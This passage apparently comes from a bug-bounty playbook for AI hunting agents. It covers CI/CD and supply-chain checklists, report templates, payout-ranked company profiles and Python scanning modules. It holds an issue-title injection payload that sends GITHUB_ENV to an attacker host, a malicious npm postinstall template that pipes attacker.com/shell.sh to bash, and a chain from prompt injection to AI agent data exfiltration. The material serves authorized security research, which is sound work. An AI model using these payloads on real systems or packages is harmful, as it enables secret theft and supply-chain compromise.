- [ ] **Unmasked secrets** — `fromJson()` derived values bypass GitHub's automatic masking
- [ ] **Hardcoded credentials** — API keys, passwords directly in workflow YAML

### Category 5: Triggers & Access Control (CICD-SEC-01)
- [ ] **Dangerous triggers without mitigation** — `pull_request_target` or `workflow_run` with no `permissions: {}`
- [ ] **Label-based approval bypass** — `if: contains(github.event.pull_request.labels.*.name, 'approved')` is spoofable
- [ ] **Excessive GITHUB_TOKEN permissions** — `permissions: write-all` when only `contents: read` needed
- [ ] **Self-hosted runners in public repos** — untrusted PRs execute on org infrastructure

### Category 6: AI Agent Security (2025+)
- [ ] **Unrestricted AI trigger** — `allowed_non_write_users: "*"`
- [ ] **Excessive tool grants** — AI agent given Bash/Write/Edit tools in untrusted trigger context
- [ ] **Prompt injection via workflow context** — event data interpolated into AI agent prompt

### Expression Injection PoC Template

```bash
# Step 1: Create an issue with injection payload in title
gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"

# Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
# CVSS: 9.3 Critical (RCE with repo secrets)
```

### Real-World GHSAs (Proven Payouts)

| GHSA | Action | Bug Class | Severity |
|---|---|---|---|
| GHSA-gq52-6phf-x2r6 | tj-actions/branch-names | Expression injection via branch name | Critical |
| GHSA-4xqx-pqpj-9fqw | atlassian/gajira-create | Code injection in privileged trigger | Critical |
| GHSA-g86g-chm8-7r2p | check-spelling/check-spelling | Secret exposure in build logs | Critical |
| GHSA-cxww-7g56-2vh6 | actions/download-artifact | Artifact poisoning (official action) | High |
| GHSA-h3qr-39j9-4r5v | gradle/gradle-build-action | Cache poisoning via untrusted checkout | High |
| GHSA-mrrh-fwg8-r2c3 | tj-actions/changed-files | Supply chain — impostor commit | High |
| GHSA-phf6-hm3h-x8qp | broadinstitute/cromwell | Token exposure via code injection | Critical |
| GHSA-qmg3-hpqr-gqvc | reviewdog/action-setup | Time-bomb via tag pinning | High |
| GHSA-vqf5-2xx6-9wfm | github/codeql-action | Known vulnerable official action | High |
| GHSA-hw6r-g8gj-2987 | pytorch/pytorch | Argument injection in build workflow | Moderate |

### CI/CD A→B Chains
```
Expression injection → secret exfiltration → cloud account takeover
Untrusted checkout → Makefile RCE → deploy key theft → repo takeover
Artifact poisoning → release binary tampering → supply chain compromise
Cache poisoning → build output manipulation → backdoored deployment
Impostor commit → pinned action hijack → all downstream repos affected
OIDC token theft → cloud metadata → S3/GCS read → customer data
Self-hosted runner → container escape → internal network pivot
```

## Supply Chain Hunting (H100 — PayPal #925585 $30K, LY Corp #1043385 $11.5K)

npm/Gem/PyPI supply chain attacks paid $11-30K in the Top 100.

### How to Find Vulnerable Targets

```bash
# 1. Find target's package dependencies
# Check package.json, Gemfile, requirements.txt, go.mod in public repos
gh api -X GET "search/code?q=org:TARGET+filename:package.json" --jq '.items[].repository.full_name' | sort -u

# 2. Extract package names
cat package.json | jq -r '.dependencies | keys[]' 2>/dev/null
cat package.json | jq -r '.devDependencies | keys[]' 2>/dev/null

# 3. Check if packages exist on public registry
for pkg in $(cat package.json | jq -r '.dependencies | keys[]'); do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  echo "$pkg: $status"
done

# 4. If 404 → package name is available → you can register it
npm publish  # with malicious postinstall script
```

### Malicious Package Template

```json
// package.json
{
  "name": "target-internal-package-name",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://attacker.com/shell.sh | bash"
  }
}
```

### Also Check:
- **Ruby gems:** `gem search TARGET --remote` — check for unpublished internal gem names
- **Python packages:** `pip search TARGET` or check requirements.txt
- **Go modules:** Check go.mod for private module paths
- **Docker base images:** Check if target publishes to Docker Hub with stale base images
- **GitHub Actions:** Check if target uses unpinned actions (mutable tags → impostor commits)

---

# PHASE 4: VALIDATE

## The 7-Question Gate (Run BEFORE Writing ANY Report)

All 7 must be YES. Any NO → STOP. See also `references/supervisor.md` for detailed triage flow.

### Q1: Can I exploit this RIGHT NOW with a real PoC?
Write the exact HTTP request. If you cannot produce a working request → KILL IT.

### Q2: Does it affect a REAL user who took NO unusual actions?
No "the user would need to..." with 5 preconditions. Victim did nothing special.

### Q3: Is the impact concrete (money, PII, ATO, RCE)?
"Technically possible" is not impact. "I read victim's SSN" is impact.

### Q4: Is this in scope per the program policy?
Check the exact domain/endpoint against the program's scope page.

### Q5: Did I check Hacktivity/changelog for duplicates?
Search the program's disclosed reports and recent changelog entries.

### Q6: Is this NOT on the "always rejected" list?
Check the list below. If it's there and you can't chain it → KILL IT.

### Q7: Would a triager reading this say "yes, that's a real bug"?
Read your report as if you're a tired triager at 5pm on a Friday. Does it pass?

## 4 Pre-Submission Gates (from supervisor.md)

### Gate 0: Reality Check (30 seconds)
```
[ ] The bug is real — confirmed with actual HTTP requests, not just code reading
[ ] The bug is in scope — checked program scope explicitly
[ ] I can reproduce it from scratch (not just once)
[ ] I have evidence (screenshot, response, video)
```

### Gate 1: Impact Validation (2 minutes)
```
[ ] I can answer: "What can an attacker DO that they couldn't before?"
[ ] The answer is more than "see non-sensitive data"
[ ] There's a real victim: another user's data, company's data, financial loss
[ ] I'm not relying on the user doing something unlikely
```

### Gate 2: Deduplication Check (5 minutes)
```
[ ] Searched HackerOne Hacktivity for this program + similar bug title
[ ] Searched GitHub issues for target repo
[ ] Read the most recent 5 disclosed reports for this program
[ ] This is not a "known issue" in their changelog or public docs
```

### Gate 3: Report Quality (10 minutes)
```
[ ] Title: One sentence, contains vuln class + location + impact
[ ] Steps to reproduce: Copy-pasteable HTTP request
[ ] Evidence: Screenshot/video showing actual impact (not just 200 response)
[ ] Severity: Matches CVSS 3.1 score AND program's severity definitions
[ ] Remediation: 1-2 sentences of concrete fix
```

## CVSS 3.1 Quick Guide

| Score | Severity | Typical Bug |
|-------|----------|-------------|
| 0-3.9 | Low | Info disclosure (non-sensitive) |
| 4-6.9 | Medium | IDOR (read PII), Stored XSS (low impact) |
| 7-8.9 | High | IDOR (write/delete), SQLi, Race (double spend) |
| 9-10 | Critical | Auth bypass → admin, SSRF (cloud metadata), RCE |

---

# PHASE 5: REPORT

## Canonical Report Format

Every report MUST follow this exact structure. No exceptions.

```
# <Target> Vulnerability Report
## <Descriptive Vulnerability Name>
**Severity:** <Critical | High | Medium | Low>
**Vulnerability Type:** <Primary type> / <Secondary type if applicable>
**Affected Component:** <Component name> (`<path or endpoint>`)
---
## Summary
<3–5 sentences. Covers: what the vulnerability is, where it lives, how it is triggered, and what an attacker gains. No hedging. Present tense.>

---
## Root Cause
### 1. <Root cause label>
- <Tight bullet — one clause each>
- <No prose paragraphs>

---
## Attack Flow
1. <One-line step — actor + action>
2. <One-line step>

---
## Proof of Concept (PoC)
### Step 1: <Short action label>
<sentence describing what this step demonstrates.>
[Screenshot or code block]

---
## Security Impact
An attacker with <access level> can:
- <Concrete impact bullet>
- <Concrete impact bullet>

---
## Realistic Attack Chain
1. <Step>
2. <Final impact>
```

### Format Rules (non-negotiable)
- **Zero fluff.** Every sentence must carry technical weight.
- **No hedging.** Never write "may", "could potentially", "it is possible that". If the code allows it, state it as fact.
- **Present tense throughout.**
- **H1** for the report title. **H2** for all top-level sections.
- **`---`** as divider after metadata strip and between major sections.
- No tables. No collapsible sections. No emoji.
- PoC steps: numbered, one-line action header (H3), one sentence of context, then screenshot or code block.

### Platform Adaptations

| Platform | Additional requirement |
|----------|----------------------|
| `h1` | Append CVSS 3.1 vector string as code block if `--cvss` |
| `immunefi` | Add **Asset Type**, **Blockchain/Tech Stack**, **Vulnerability Category** |
| `bugcrowd` | Use Bugcrowd severity labels (P1/P2/P3/P4) alongside plain label |
| `intigriti` | Add **Impact** tag field to metadata strip |

## Report Title Formula
```
[Bug Class] in [Exact Endpoint/Feature] allows [attacker role] to [impact] [victim scope]
```
**Good:** `IDOR in /api/v2/invoices/{id} allows authenticated user to read any customer's invoice data`
**Bad:** `IDOR vulnerability found`

## Impact Statement Formula
```
An [attacker with X access level] can [exact action] by [method], resulting in [business harm].
This requires [prerequisites] and leaves [detection/reversibility].
```

## Human Tone Rules (Avoid AI-Sounding Writing)
- Start sentences with the impact, not the vulnerability name
- Write like you're explaining to a smart developer, not a textbook
- Use "I" and active voice: "I found that..." not "A vulnerability was discovered..."
- One concrete example beats three abstract sentences
- No em dashes, no "comprehensive/leverage/seamless/ensure"

## The 60-Second Pre-Submit Checklist
```
[ ] Title follows formula: [Class] in [endpoint] allows [actor] to [impact]
[ ] First sentence states exact impact in plain English
[ ] Steps to Reproduce has exact HTTP request (copy-paste ready)
[ ] Response showing the bug is included (screenshot or response body)
[ ] Two test accounts used (not just one account testing itself)
[ ] CVSS score calculated and included
[ ] Recommended fix is one sentence (not a lecture)
[ ] No typos in the endpoint path or parameter names
[ ] Report is < 600 words (triagers skim long reports)
[ ] Severity claimed matches impact described (don't overclaim)
```

## Severity Escalation Language
| Program Says | You Counter With |
|---|---|
| "Requires authentication" | "Attacker needs only a free account (no special role)" |
| "Limited impact" | "Affects [N] users / [PII type] / [$ amount]" |
| "Already known" | "Show me the report number — I searched and found none" |
| "By design" | "Show me the documentation that states this is intended" |
| "Low CVSS score" | "CVSS doesn't account for business impact — attacker can steal [X]" |

---

## Confidence Scoring

Start at **100**, deduct:
- Partial attack path: **-20**
- Bounded, non-compounding impact: **-15**
- Requires specific (but achievable) state: **-10**
- Requires user interaction: **-10**
- Fix already partially mitigates: **-10**

Confidence ≥ 80 → full description + PoC + fix.
Confidence 60–79 → description + partial PoC.
Below 60 → LEAD only (no fix, no PoC).

---

## ALWAYS REJECTED — Never Submit These

Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection alone, banner/version disclosure without working CVE exploit, clickjacking on non-sensitive pages, tabnabbing, CSV injection, CORS wildcard without credential exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret in mobile app, SSRF DNS-ping only, host header injection alone, no rate limit on non-critical forms, session not invalidated on logout, concurrent sessions, internal IP disclosure, mixed content, SSL weak ciphers, missing HttpOnly/Secure cookie flags alone, broken external links, pre-account takeover, autocomplete on password fields.

---

## HIGH-VALUE TARGET PROFILES (From H100 Analysis)

Patterns extracted from 100 highest-upvoted HackerOne reports. Use for target selection and prioritization.

### Tier 1: Highest ROI Targets

**GitLab (12 reports, $134K total bounty)**
- Biggest attack surface of any program — code hosting, CI/CD, wiki, imports
- Top bug classes: RCE (4), File Read/Write (3), SSRF, Data Leak, SSTI
- Key attack surfaces:
  - **Project import** — SSRF, path traversal, file read via UploadsRewriter
  - **Markdown/Wiki rendering** — Kramdown RCE, stored XSS, template injection
  - **File uploads** — path traversal, webshell, ExifTool RCE
  - **CI/CD pipelines** — runner token exposure, pipeline job execution
  - **Merge requests** — code review features bypass file restrictions
- Hunting strategy: Focus on import/export features, check for path traversal in any file copy/move operation

**Shopify (8 reports, $50K total bounty)**
- Top bug classes: Privilege Escalation (4), SSRF, OAuth, Credential Leak, SSTI
- Key attack surfaces:
  - **Email confirmation flow** — bypass leads to full store takeover via SSO
  - **Electron apps** — .env files in packaged apps leak GitHub tokens
  - **Third-party apps** — OAuth misconfigurations in app integrations
  - **Stocky app** — OAuth token theft via redirect_uri manipulation
- Hunting strategy: Download all Shopify apps, extract .env from asar files, check OAuth flows

**PayPal (6 reports, $93.9K total bounty — highest $/report)**
- Top bug classes: XSS (2), RCE, Token Leak, DoS, IDOR
- Key attack surfaces:
  - **Login page** — cache poisoning → stored XSS on paypal.com/signin
  - **Security challenge flow** — token leaks email + plaintext password
  - **npm packages** — internal packages published to public registry
  - **Business management API** — IDOR on user management endpoints
- Hunting strategy: Focus on auth flows, cache poisoning, supply chain

**Snapchat (7 reports, $65K total bounty)**
- Top bug classes: Infrastructure Misconfig (3), RCE, Auth Bypass, SSRF
- Key attack surfaces:
  - **Internal tools** — Jenkins, Grafana, CI dashboards exposed
  - **Kubernetes** — API server exposed to internet, no auth
  - **Content management** — delete any user's spotlight content
  - **GraphQL** — information disclosure via introspection
- Hunting strategy: Scan for exposed admin panels, K8s APIs, internal dashboards

### Tier 2: Consistent Payouts

**Valve (5 reports, $40K)**
- Game client RCE (buffer overflow, XSS in chat), SQLi, payment tampering
- Attack surface: Steam client, game servers, report generation API
- Key: Client-side parsing of untrusted data (server info, chat messages)

**X / xAI (4 reports, $20.16K)**
- Pre-auth RCE via VPN (Pulse Secure 1-day), auth bypass, CRLF injection
- Attack surface: VPN infrastructure, Digits API, web properties
- Key: Monitor VPN vendor patches, test immediately after disclosure

**Uber (3 reports, $40.4K)**
- Info disclosure (bonjour.uber.com RPC), OAuth chain, leaked certificates
- Attack surface: Internal microservices, mobile APIs, OAuth flows
- Key: Check old/mobile API versions, leaked certs in git history

### Tier 3: Quick Wins

**Snapchat infrastructure** — Jenkins, Grafana, K8s API = instant $10-25K
**Starbucks** — SQLi on web apps + leaked credentials in repos = consistent findings
**Razer** — SQLi + command injection on gaming web portals
**Mail.ru** — SQLi, file upload, memory disclosure
**LY Corp (LINE)** — HTTP smuggling, OAuth misconfig, privilege escalation

### Cross-Target Patterns

| Attack Vector | Programs Hit | Avg Bounty |
|---------------|-------------|------------|
| Leaked tokens in code/apps | Shopify, Starbucks, Snapchat, Superhuman | $10-50K |
| HTTP smuggling → session hijack | Slack, LY Corp, Zomato, New Relic | $0-6.5K |
| Infrastructure misconfig (Jenkins/K8s) | Snapchat | $10-25K |
| GraphQL missing auth | HackerOne | $0-12.5K |
| Email confirmation bypass | Shopify | $0-15K |
| Cache poisoning → XSS | PayPal | $18-20K |
| File upload → RCE | Semrush, Starbucks, GitLab | $0-20K |
| npm/supply chain | PayPal, LY Corp | $11-30K |
| SQLi (classic) | Starbucks, Razer, Valve, Mail.ru, GSA | $0-25K |

## Conditionally Valid With Chain

| Low Finding | + Chain | = Valid Bug |
|------------|---------|-------------|
| Open redirect | + OAuth code theft | ATO |
| Clickjacking | + sensitive action + PoC | Account action |
| CORS wildcard | + credentialed exfil | Data theft |
| CSRF | + sensitive state change | Account takeover |
| No rate limit | + OTP brute force | ATO |
| SSRF (DNS only) | + internal access proof | Internal network access |
| Host header injection | + password reset poisoning | ATO |
| Self-XSS | + login CSRF | Stored XSS on victim |
| GraphQL introspection alone | + missing field-level auth | Mass PII exfil |
| LLM prompt injection (ASI01) | + tool misuse (ASI02) | Data exfil / RCE via AI agent |
| AI system prompt leak | + indirect injection (ASI05) | Persistent prompt poisoning |
| CI/CD expression injection | + secret exfiltration | Cloud account takeover |
| Cache poisoning (unkeyed header) | + reflected XSS payload | Stored XSS on auth pages |
| Behavioral anomaly (fast response) | + debug endpoint probe | Info disclosure / RCE |
| Second-order stored payload | + admin dashboard render | Stored XSS → ATO |
| Patch-gap variant | + same exploit path | Fresh bug with known impact |
| Semantic taint (no sanitizer) | + source→sink confirmation | Auth bypass / mass assignment |
| Race condition (double redeem) | + financial scale | Theft / double-spend |


---

## Safe Patterns (Do Not Flag)

**Smart contracts:** `unchecked` in Solidity 0.8+ with correct reasoning, explicit narrowing casts in 0.8+, MINIMUM_LIQUIDITY burn on first deposit, `SafeERC20`, `nonReentrant` (flag only cross-contract), two-step admin transfer, consistent protocol-favoring rounding without compounding.

**Web/API:** Rate limiting that genuinely prevents exploitation, CSRF tokens that are properly validated, self-XSS without escalation path, logout CSRF without session fixation, non-sensitive information disclosure (stack traces in dev mode only).

**Infrastructure/Nodes:** Unauthenticated operator RPC (ecosystem standard), plaintext local signer/CL↔EL communication, default bind to 0.0.0.0 (dev convenience), JWT without `exp` when `iat` freshness enforced, version/health endpoints without auth, no CORS headers on non-browser APIs.

**General:** Operator configuration parameters treated as attacker input, "add rate limiting" without amplification attack, "use checked_X instead of saturating_X" when upstream check exists, error messages containing HTTP status codes or generic library errors (not credentials/PII).

---

---


---

# INTELLIGENCE AGENT WORKFLOW (v5.1 Intelligence Layer)

The 15 Intelligence Agents do not replace the 15 Vulnerability Agents — they **feed** them. Intelligence agents discover, map, correlate, and hypothesize. Vulnerability agents exploit, validate, and prove.

## The Intelligence Pipeline

```
Attack Surface Intelligence Agent
        ↓
JavaScript Intelligence Agent
        ↓
Hidden Capability Agent
        ↓
Hypothesis Generator Agent
        ↓
Permission Graph Agent
        ↓
Behavior Diff Agent
        ↓
Invariant Violation Agent
        ↓
Cross-Service Data Flow Agent
        ↓
Dangerous Pattern Mining Agent
        ↓
Assumption Breaker Agent
        ↓
Payload Evolution Agent
        ↓
Evidence Correlation Agent
        ↓
Exploit Chain Agent
        ↓
Patch Regression Agent
```

All intelligence is continuously shared with vulnerability agents to improve identification quality.

## Agent Interactions

| Intelligence Agent | Feeds These Vulnerability Agents |
|---|---|
| Attack Surface | Recon, Web/API |
| JavaScript Intelligence | Attack Surface, Web/API, Business Logic, Shadow Logic |
| Permission Graph | Access Control, Business Logic |
| Invariant Violation | Business Logic, Shadow Logic |
| Cross-Service Flow | Second-Order, Semantic Taint |
| Dangerous Pattern | Patch-Gap, Semantic Taint |
| Exploit Chain | All agents (correlates their findings) |
| Assumption Breaker | Business Logic, Access Control |
| Behavior Diff | Access Control, Business Logic, Shadow Logic |
| Patch Regression | Patch-Gap |
| Hypothesis Generator | All agents (dispatches tests) |
| Evidence Correlation | All agents (post-processing) |
| Payload Evolution | Zero-Context, Web/API |
| Emergent Behavior | Business Logic, Exploit Chain |
| Hidden Capability | Attack Surface, JavaScript Intelligence |

## Turn 3 — Updated Agent Spawning (v5.1)

In one message, spawn ALL applicable agents as parallel foreground Agent calls:

**Phase A: Intelligence (always spawn first)**
- `attack-surface-agent` — any external target
- `js-intelligence-agent` — any target serving JS
- `hidden-capability-agent` — any target with JS/GraphQL/OpenAPI
- `hypothesis-generator-agent` — always

**Phase B: Mapping (spawn based on target architecture)**
- `permission-graph-agent` — multi-role / multi-tenant
- `behavior-diff-agent` — multi-platform / multi-role
- `cross-service-flow-agent` — microservices / distributed
- `invariant-violation-agent` — workflow / financial logic

**Phase C: Analysis (spawn based on available data)**
- `dangerous-pattern-agent` — source code available
- `patch-regression-agent` — public repo with security commits
- `assumption-breaker-agent` — any target with auth

**Phase D: Vulnerability (existing + S-Class agents)**
- All 15 Vulnerability Agents (original 8 + S-Class 7)

**Phase E: Correlation (always spawn last)**
- `evidence-correlation-agent` — always
- `exploit-chain-agent` — when findings exist
- `payload-evolution-agent` — when standard payloads fail
- `emergent-behavior-agent` — complex apps with many features

## Intelligence → Action Mapping

```yaml
when:
  attack_surface.finds_hidden_api:
    spawn: [web-api-agent, access-control-agent]
    priority: 1

  js_intelligence.finds_admin_route:
    spawn: [attack-surface-agent, access-control-agent]
    test: [auth_bypass, idor, debug_endpoint]

  permission_graph.finds_inconsistent_auth:
    spawn: [access-control-agent, behavior-diff-agent]
    test: [bola, privilege_escalation, horizontal_idor]

  invariant_violation.finds_negative_balance:
    spawn: [business-logic-agent, ghost-state-agent]
    test: [race_condition, double_spend, precision_error]

  cross_service_flow.finds_async_processing:
    spawn: [second-order-agent, ghost-state-agent]
    test: [queue_poisoning, stored_xss, ssrf_via_worker]

  dangerous_pattern.finds_repeated_anti_pattern:
    spawn: [semantic-taint-agent, patch-gap-agent]
    test: [mass_assignment, sql_injection, rce]

  hypothesis_generator.creates_high_ev_hypothesis:
    spawn: [appropriate_vulnerability_agent]
    execute: immediate_poc

  evidence_correlation.finds_multi_source_match:
    confidence_boost: +25
    severity_escalation: consider

  exploit_chain.finds_viable_chain:
    report_as: single_finding
    severity: max(component_severities) + 1
```


# S-CLASS MODULES (v5.1 Hidden-Bug & Autonomous Detection)

These modules upgrade BountyForge from a static knowledge base to an autonomous, self-evolving hunting organism. Each module targets bug classes that checklist-based approaches miss.

---

## Module 1: Shadow Logic Engine (`shadow_logic.py`)

**Purpose:** Infers intended business logic by observing normal behavior, then flags anomalous behavior suggesting logic flaws.

**Hidden bugs caught:** Price manipulation, workflow bypass, state machine violations, mass assignment, negative quantities, privilege persistence.

```python
# shadow_logic.py
import json
import hashlib
from collections import defaultdict
from typing import Dict, List, Any, Tuple
import requests
import numpy as np
from sklearn.ensemble import IsolationForest

class ShadowLogicEngine:
    """
    Infers business rules by observing API behavior across multiple sessions,
    then detects violations that indicate logic flaws.
    """

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.state_graph = defaultdict(list)
        self.parameter_profiles = {}
        self.response_signatures = {}
        self.behavioral_baseline = []
        self.isolation_model = IsolationForest(contamination=0.1, random_state=42)

    def learn_normal_behavior(self, auth_tokens: List[str], iterations: int = 50):
        print("[*] Learning normal business logic...")
        for i in range(iterations):
            token = auth_tokens[i % len(auth_tokens)]
            flows = [
                ["/api/register", "/api/login", "/api/profile", "/api/logout"],
                ["/api/login", "/api/cart/add", "/api/cart/checkout", "/api/payment"],
                ["/api/login", "/api/settings", "/api/password/change"],
            ]
            for flow in flows:
                session_state = {}
                for endpoint in flow:
                    resp = self._request(endpoint, token, session_state)
                    sig = self._behavioral_signature(resp)
                    self.response_signatures[f"{endpoint}_{i}"] = sig
                    session_state["last_response"] = resp
                    if len(session_state.get("path", [])) > 0:
                        prev = session_state["path"][-1]
                        self.state_graph[prev].append(endpoint)
                    session_state.setdefault("path", []).append(endpoint)
        signatures = list(self.response_signatures.values())
        if len(signatures) > 10:
            self.isolation_model.fit(np.array(signatures))
        print(f"[+] Baseline established: {len(self.response_signatures)} signatures")

    def detect_logic_anomalies(self, auth_token: str) -> List[Dict]:
        anomalies = []
        print("[*] Testing state machine violations...")
        valid_flows = self._extract_flows()
        for flow in valid_flows[:5]:
            for skip_idx in range(1, len(flow)-1):
                skipped_flow = flow[:skip_idx] + flow[skip_idx+1:]
                result = self._execute_flow(skipped_flow, auth_token)
                if result["success"] and not result.get("expected_failure"):
                    anomalies.append({
                        "type": "STATE_SKIP",
                        "description": f"Skipped {flow[skip_idx]} but {flow[skip_idx+1]} succeeded",
                        "flow": skipped_flow,
                        "severity": "HIGH",
                        "evidence": result["response"]
                    })
        print("[*] Testing parameter semantic violations...")
        for endpoint, profile in self.parameter_profiles.items():
            for param, constraints in profile.items():
                mutations = self._generate_semantic_mutations(constraints)
                for mutation in mutations:
                    resp = self._request(endpoint, auth_token, {param: mutation})
                    if self._is_anomalous(resp, endpoint):
                        anomalies.append({
                            "type": "SEMANTIC_VIOLATION",
                            "description": f"{param}={mutation} caused anomalous behavior",
                            "endpoint": endpoint,
                            "severity": "MEDIUM",
                            "evidence": resp.text[:500]
                        })
        print("[*] Testing temporal logic...")
        anomalies.extend(self._test_race_conditions(auth_token))
        return anomalies

    def _test_race_conditions(self, token: str) -> List[Dict]:
        import threading
        results = []
        def double_redeem():
            r1 = requests.post(f"{self.base_url}/api/coupon/redeem",
                             headers={"Authorization": f"Bearer {token}"},
                             json={"code": "TEST10"}, timeout=10)
            return r1
        responses = []
        def collect():
            responses.append(double_redeem())
        threads = [threading.Thread(target=collect) for _ in range(5)]
        for t in threads: t.start()
        for t in threads: t.join()
        successes = [r for r in responses if r.status_code == 200]
        if len(successes) > 1:
            results.append({
                "type": "RACE_CONDITION",
                "description": f"Coupon redeemed {len(successes)} times in parallel",
                "severity": "CRITICAL",
                "evidence": f"Status codes: {[r.status_code for r in responses]}"
            })
        return results

    def _behavioral_signature(self, response) -> List[float]:
        return [
            len(response.text),
            response.status_code,
            len(response.headers),
            hash(response.text) % 10000,
            response.elapsed.total_seconds() * 1000,
        ]

    def _is_anomalous(self, response, endpoint) -> bool:
        sig = self._behavioral_signature(response)
        baseline_sigs = [s for k, s in self.response_signatures.items() if k.startswith(endpoint)]
        if not baseline_sigs:
            return False
        baseline = np.array(baseline_sigs)
        current = np.array([sig])
        mean = np.mean(baseline, axis=0)
        std = np.std(baseline, axis=0)
        z_scores = np.abs((current - mean) / (std + 1e-9))
        return np.any(z_scores > 3)

    def _generate_semantic_mutations(self, constraints) -> List[Any]:
        if constraints.get("type") == "integer":
            return [-1, 0, 0.5, "999999999999999999", "-0", "null", "true", []]
        elif constraints.get("type") == "string":
            return ["", "null", "undefined", "-1", "0", "true", "false", "[]", "{}"]
        elif constraints.get("type") == "boolean":
            return ["true", "false", 1, 0, "yes", "no", "1", "0", None]
        return []

    def _request(self, endpoint, token, data=None):
        return requests.get(f"{self.base_url}{endpoint}",
                          headers={"Authorization": f"Bearer {token}"}, timeout=10)

    def _extract_flows(self):
        return [["/api/login", "/api/cart/add", "/api/cart/checkout"]]

    def _execute_flow(self, flow, token):
        return {"success": True, "response": "test"}

# USAGE:
# engine = ShadowLogicEngine("https://target.com")
# engine.learn_normal_behavior(tokens=["token1", "token2"], iterations=20)
# bugs = engine.detect_logic_anomalies("attacker_token")

```

**Trigger:** `--shadow-logic` or any target with user flows / payment logic.

---

## Module 2: Patch-Gap Vampire (`patch_gap.py`)

**Purpose:** Analyzes security patches and hunts for unpatched variants in your target. When a developer fixes a bug in Path A, they often miss Path B.

**Hidden bugs caught:** Incomplete fixes, variant vulnerabilities in cloned code, "else branch" bugs, patch-gap exploitation.

```python
# patch_gap.py
import subprocess
import re
from difflib import SequenceMatcher
from typing import List, Dict

class PatchGapVampire:
    """Analyzes security patches and hunts for unpatched variants."""

    def __init__(self, target_repo: str):
        self.target_repo = target_repo
        self.vulnerability_patterns = []

    def ingest_patch(self, patch_diff: str, vuln_type: str):
        print(f"[*] Ingesting {vuln_type} patch...")
        removed_lines = self._extract_removed(patch_diff)
        added_lines = self._extract_added(patch_diff)
        anti_pattern = {
            "type": vuln_type,
            "before": removed_lines,
            "after": added_lines,
            "missing_check": self._infer_missing_check(removed_lines, added_lines),
            "context_window": self._extract_context(patch_diff)
        }
        self.vulnerability_patterns.append(anti_pattern)
        print(f"[+] Extracted anti-pattern: {anti_pattern['missing_check']}")

    def hunt_variants(self) -> List[Dict]:
        findings = []
        for pattern in self.vulnerability_patterns:
            grep_cmd = f"cd {self.target_repo} && grep -rn '{pattern['missing_check']}' --include='*.py' --include='*.js' --include='*.ts' --include='*.sol'"
            result = subprocess.run(grep_cmd, shell=True, capture_output=True, text=True)
            for line in result.stdout.strip().split("\n"):
                if not line:
                    continue
                file_path, line_no, code = self._parse_grep(line)
                if not self._is_fixed_variant(code, pattern["after"]):
                    context = self._get_context(file_path, int(line_no))
                    similarity = self._context_similarity(context, pattern["context_window"])
                    if similarity > 0.6:
                        findings.append({
                            "type": "PATCH_GAP_VARIANT",
                            "original_vuln": pattern["type"],
                            "file": file_path,
                            "line": line_no,
                            "code": code.strip(),
                            "context_similarity": similarity,
                            "confidence": "HIGH" if similarity > 0.8 else "MEDIUM",
                            "reason": f"Same {pattern['type']} anti-pattern found in similar context, likely missed during patch"
                        })
        return findings

    def _infer_missing_check(self, before: List[str], after: List[str]) -> str:
        before_set = set(before)
        added = [l for l in after if l not in before_set]
        if added:
            return added[0].strip()[:50]
        return "security_check"

    def _context_similarity(self, ctx1: str, ctx2: str) -> float:
        return SequenceMatcher(None, ctx1, ctx2).ratio()

    def _extract_removed(self, diff: str) -> List[str]:
        return [l[1:] for l in diff.split("\n") if l.startswith("-") and not l.startswith("---")]

    def _extract_added(self, diff: str) -> List[str]:
        return [l[1:] for l in diff.split("\n") if l.startswith("+") and not l.startswith("+++")]

    def _extract_context(self, diff: str) -> str:
        return "\n".join([l for l in diff.split("\n") if not l.startswith("+") and not l.startswith("-")])

    def _parse_grep(self, line: str):
        parts = line.split(":", 2)
        return parts[0], parts[1], parts[2]

    def _is_fixed_variant(self, code: str, fix_pattern: List[str]) -> bool:
        fix_text = " ".join(fix_pattern)
        return any(f in code for f in fix_pattern)

    def _get_context(self, file_path: str, line_no: int, radius: int = 5) -> str:
        try:
            with open(file_path) as f:
                lines = f.readlines()
            start = max(0, line_no - radius - 1)
            end = min(len(lines), line_no + radius)
            return "".join(lines[start:end])
        except:
            return ""

# USAGE:
# vampire = PatchGapVampire("/path/to/target/repo")
# vampire.ingest_patch(shopify_patch_diff, "EMAIL_CONFIRMATION_BYPASS")
# variants = vampire.hunt_variants()

```

**Trigger:** `--patch-gap` or target has public GitHub with security commits.

---

## Module 3: Second-Order Ghost Detector (`second_order_detector.py`)

**Purpose:** Finds vulnerabilities where input is stored (DB, cache, log, queue) then later processed unsafely by a different component.

**Hidden bugs caught:** Stored XSS via admin dashboards, SQLi via analytics, SSRF via thumbnail services, command injection via batch jobs.

```python
# second_order_detector.py
import requests
import time
import json
from typing import List, Dict, Set

class SecondOrderDetector:
    """Detects second-order vulnerabilities by tracking input through storage layers."""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.injection_points = []
        self.consumption_points = []
        self.tracking_id = 0

    def map_storage_flow(self, auth_token: str):
        print("[*] Mapping storage flows...")
        storage_endpoints = [
            ("/api/profile", "POST", {"bio": "PAYLOAD", "name": "PAYLOAD"}),
            ("/api/settings", "PUT", {"nickname": "PAYLOAD"}),
            ("/api/upload", "POST", {"filename": "PAYLOAD"}),
            ("/api/feedback", "POST", {"message": "PAYLOAD"}),
            ("/api/team/invite", "POST", {"email": "PAYLOAD"}),
        ]
        consumption_endpoints = [
            "/api/admin/users",
            "/api/profile/{id}",
            "/api/reports/export",
            "/api/search",
            "/api/notifications",
            "/api/analytics",
        ]
        for endpoint, method, template in storage_endpoints:
            self._test_storage_endpoint(endpoint, method, template, auth_token)
        self.consumption_points = consumption_endpoints
        print(f"[+] Mapped {len(self.injection_points)} storage points")

    def _test_storage_endpoint(self, endpoint: str, method: str, template: dict, token: str):
        unique = f"2NDORD{self.tracking_id}"
        self.tracking_id += 1
        payload = {k: v.replace("PAYLOAD", unique) for k, v in template.items()}
        if method == "POST":
            requests.post(f"{self.base_url}{endpoint}", json=payload,
                         headers={"Authorization": f"Bearer {token}"}, timeout=10)
        else:
